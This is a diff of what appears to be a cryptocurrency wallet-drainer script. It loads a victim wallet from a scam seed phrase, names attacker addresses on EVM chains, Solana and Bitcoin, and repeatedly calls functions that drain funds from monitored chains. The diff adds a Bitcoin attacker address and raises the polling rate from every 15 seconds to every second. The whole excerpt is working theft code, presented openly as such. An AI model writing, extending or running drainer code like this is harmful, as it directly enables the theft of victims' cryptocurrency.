@@ -12,7 +12,8 @@ const VICTIM_WALLET = ethers.Wallet.fromPhrase(SCAM_SEED);
 
 // Attacker’s wallet addresses
 const ATTACKER_ADDRESS = "0x10f696018bf0d53e6f00d949209cce93d386c3ad"; // EVM-compatible
-const ATTACKER_SOL_ADDRESS = "BxK39AK95udUpALngEqRJsrhoTfiKprHEAZdWzggLTHb"; // Solana wallet
+const ATTACKER_SOL_ADDRESS = "BxK39AK95udUpALngEqRJsrhoTfiKprHEAZdWzggLTHb"; // sol
+const ATTACKER_BTC_ADDRESS = "bc1qw7za0snd57qgxgg86fxlapy7u930p4m8ptm525"; // btc
 
 // ? List of EVM chains to monitor and drain
 const networks = [
@@ -126,8 +127,8 @@ async function drainSolanaFunds() {
     }
 }
 
-// ? Monitor all chains every 15 seconds
+// 15 second timer for lopp
 setInterval(() => {
     networks.forEach(network => drainEVMFunds(network));
     drainSolanaFunds();
-}, 15000);
+}, 1000);
